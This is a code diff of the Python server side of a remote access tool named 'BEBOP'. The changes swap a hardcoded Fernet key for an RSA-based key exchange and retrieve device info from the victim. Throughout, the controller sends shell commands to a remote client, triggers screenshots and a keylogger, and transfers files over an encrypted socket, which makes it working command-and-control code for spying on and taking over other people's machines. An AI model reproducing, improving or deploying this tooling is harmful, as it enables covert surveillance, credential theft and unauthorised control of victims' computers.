@@ -1,44 +1,48 @@
+import base64
 import socket
 import sys
 import time
 import os
+import base64
+import rsa
+from rsa import PublicKey
 from cryptography.fernet import Fernet
 
-address = ("0.0.0.0", 3001)
-f_key = b'FhnnERujmRY65fVqM0S_LvK26NybEETUlK0_gvV9Dws=' # Insert key from Fernet.generate_key(), must be same as client
+address = ("0.0.0.0", 3000)
 script_cwd = os.getcwd()
 device_info = ""
+authed = False
+
 
 def print_menu():
     print("\n/-------BEBOP-------/\n")
     print("1.) Open shell")
     print("2.) Take screenshot")
     print("3.) Keylogger")
-    print("4.) Get Device Info")
-    print("5.) Exit\n\n")
+    print("4.) Exit\n\n")
 
-def get_info():
+def get_device_info():
     device_info = recv()
-    print(f"\n\n{device_info.decode()}\n\n")
+    return f"\n\n{device_info.decode()}\n\n"
 
 def recv(buff_size=1024):
     data_buff = bytes()
     data_size = conn_to_client.recv(12)
-    data_size = int(data_size.decode().rstrip())
-
-    if not data_size:
+    if len(data_size) > 0:
+        data_size = int(data_size.decode().rstrip())
+    else:
         return None
 
     while len(data_buff) < data_size:
         data_buff += conn_to_client.recv(buff_size)
 
-    return lock.decrypt(data_buff)
+    return decrypt(data_buff) if authed else data_buff
 
-def send(data):
-    header_size = 12
-    encrypted_data = lock.encrypt(data)
-    data_size = f"{len(encrypted_data):<{header_size}}"
-    conn_to_client.sendall(data_size.encode()+encrypted_data)
+def send(data, header_size=12):
+    if authed:
+        data = encrypt(data)
+    data_size = f"{len(data):<{header_size}}"
+    conn_to_client.sendall(data_size.encode()+data)
 
 
 def upload_file(file_name):
@@ -53,7 +57,7 @@ def upload_file(file_name):
         send(b'')
 
 def download_file(file_name):
-    file_data = recv(buff_size=16384)
+    file_data = recv(buff_size=32768)
     if not file_data:
         print("Could not download file...")
         return
@@ -68,27 +72,14 @@ def download_file(file_name):
 
 
 def open_shell():
-    # shell_history_forward = []
-    # shell_history_backward = []
-    # def on_press(key):
-    #     lst_cmd = ""
-    #     if key == "Key.up":
-    #         if len(shell_history_forward) > 0:
-    #                 lst_cmd = shell_history_forward.pop()
-    #                 shell_history_backward.append(lst_cmd)
-    #     elif key == "Key.down":
-    #         if len(shell_history_backward) > 0:
-    #             lst_cmd = shell_history_backward.pop()
-    #             shell_history_forward.append(lst_cmd)
-                            
-    #     print(shell_history_forward)        
-    #     print(shell_history_backward)
-    # l = Listener(on_press=on_press)
-    # l.start()
-
-
     while True:
-        cmd = input("\nbebop#: ")
+        cmd = ""
+        try:
+            cmd = input("bebop#: ")
+        except KeyboardInterrupt:
+            choice = input("\n\nQuit the program? Y or n: ")
+            if choice.lower() == 'y' or choice.lower() == "yes":
+                break
 
         if cmd:
             if cmd == "exit":
@@ -108,48 +99,54 @@ def open_shell():
                 print("Uploading...")
                 send(cmd.encode())
                 file_name = cmd[3:]
-                file_name = file_name.replace(' ', '\ ')
                 upload_file(file_name)
 
             else:
                 send(cmd.encode())
                 output = recv()
+                if output:
+                    try:
+                        output = output.decode() 
 
-                try:
-                    output = output.decode() 
+                    except:
+                        print("Already in bytes")
+            
+                    finally:
+                        print(output)
 
-                except UnicodeDecodeError:
-                    print("Already in bytes")
-                    
-                finally:
-                    print(output)
-                
+def encrypt(data):
+    return lck.encrypt(data)
 
-            #shell_history_forward.append(cmd)
-
-    #l.stop()
+def decrypt(encrypted_data):
+    return lck.decrypt(encrypted_data)
 
 def establish_connection(address):
-    global conn_to_client, lock
-    lock = Fernet(f_key)
+    global conn_to_client, authed, lck
+
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(address)
     server.listen(0)
 
     print("[+] Waiting on connections")
-    while True: 
-        conn_to_client, client_addr = server.accept()
+    while not authed: 
+        conn_to_client, _ = server.accept()
         if conn_to_client:
-            client_key = recv().decode()
-            if client_key != f_key.decode():
-                kill_connection()
-                print("[+] Unable to authenticate. Closing connection...")
+            client_key_buff = recv()
+            client_key = PublicKey.load_pkcs1(client_key_buff, 'PEM')
+            
+            key = Fernet.generate_key()
+            send(rsa.encrypt(key, client_key))
+
+            lck = Fernet(key)
+            crypto = lck.decrypt(recv())
+            if crypto == b"\n\nOK\n\n":
+                authed = True
             else:
-                send(b'OK')
-                print(f"[+] Encrypted Connection to {client_addr[0]}:{client_addr[1]} Established!")
-                break
+                kill_connection()
+
         else:
-            sys.exit("[+] Failed to recieve connection to client...Exiting")
+            kill_connection()
+            sys.exit("[+] Failed to establish secure connection to client...")
 
 def kill_connection():
     conn_to_client.shutdown(socket.SHUT_WR)
@@ -157,9 +154,11 @@ def kill_connection():
 
 def main():
     establish_connection(address)
+    device_info = get_device_info()
     
     while conn_to_client:
         try:
+            print(device_info)
             print_menu()
             choice = input("Enter Choice: ")
             send(choice.encode())
@@ -176,9 +175,6 @@ def main():
                 pass
 
             elif choice == "4":
-                get_info()
-
-            elif choice == "5":
                 keep_alive = input("[+] Keep client alive? (Y or N): ")
                 print("[+] Keeping client alive..." if keep_alive.lower() == "y" or keep_alive == "yes" else "[+] Killing client connection...")
                 send(keep_alive.encode())
@@ -188,6 +184,11 @@ def main():
             print("Connection lost...")
             print(bp)
             break
+
+        except KeyboardInterrupt:
+            choice = input("\n\nQuit the program? Y or n: ")
+            if choice.lower() == 'y' or choice.lower() == "yes":
+                break
             
         
     kill_connection()
